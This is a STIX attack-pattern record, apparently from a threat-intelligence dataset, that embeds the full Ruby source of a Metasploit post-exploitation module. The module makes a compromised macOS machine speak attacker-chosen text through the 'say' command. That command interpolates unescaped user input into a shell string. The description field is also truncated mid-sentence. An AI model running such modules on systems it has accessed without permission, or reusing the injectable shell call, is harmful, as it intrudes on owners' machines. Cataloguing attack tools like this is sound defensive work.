{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--17a40c15-0a88-4295-9bc4-9e333bf4e605",
    "created": "2024-08-14T16:33:00.694705Z",
    "modified": "2024-08-14T16:33:00.694709Z",
    "name": "OS X Text to Speech Utility",
    "description": " This module will speak whatever is in the 'TEXT' option on the victim machine.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/admin/say.rb",
            "external_id": "say.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Text to Speech Utility',\n        'Description' => %q{\n          This module will speak whatever is in the 'TEXT' option on the victim machine.\n        },\n        'References' => [\n          ['URL', 'http://www.gabrielserafini.com/blog/2008/08/19/mac-os-x-voices-for-using-with-the-say-command/']\n        ],\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TEXT', [true, 'The text to say', \"meta-sploit\\!\"]),\n        OptString.new('VOICE', [true, 'The voice to use', 'alex'])\n      ]\n    )\n  end\n\n  def exec(cmd)\n    tries = 0\n    begin\n      out = cmd_exec(cmd).chomp\n    rescue ::Timeout::Error => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    rescue EOFError => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    end\n  end\n\n  def run\n    txt = datastore['TEXT']\n    voice = datastore['VOICE']\n\n    # Say the text\n    out = cmd_exec(\"say -v \\\"#{voice}\\\" \\\"#{txt}\\\"\")\n    if out =~ /command not found/\n      print_error(\"The remote machine does not have the \\'say\\' command\")\n    elsif !out.empty?\n      print_status(out)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ sinn3r]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}